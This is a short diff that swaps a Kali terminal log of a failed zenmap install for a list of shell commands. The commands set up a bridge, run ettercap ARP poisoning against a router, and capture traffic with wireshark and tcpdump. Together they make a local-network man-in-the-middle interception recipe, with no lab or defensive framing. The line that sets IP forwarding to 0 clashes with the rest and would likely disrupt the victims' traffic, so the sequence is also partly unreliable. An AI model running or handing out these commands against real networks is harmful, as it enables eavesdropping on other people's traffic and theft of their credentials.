@@ -1,11 +1,11 @@
-┌──(kali㉿kali)-[~]
-└─$ sudo apt-get install zenmap
-Reading package lists... Done
-Building dependency tree... Done
-Reading state information... Done
-Package zenmap is not available, but is referred to by another package.
-This may mean that the package is missing, has been obsoleted, or
-is only available from another source
+sudo apt-get install bridge-utils
+sudo brctl addbr br0
+sudo brctl addif br0 eth0
+sudo ifconfig br0 up
+sudo dhclient br0
+echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
+sudo ettercap -T
+sudo ettercap -T -q -i <interface> -M arp:remote /<router-IP>/
+sudo wireshark -i <interface>
+sudo tcpdump -i <interface> -w captured_traffic.pcap
 
-E: Package 'zenmap' has no installation candidate
-                                                   
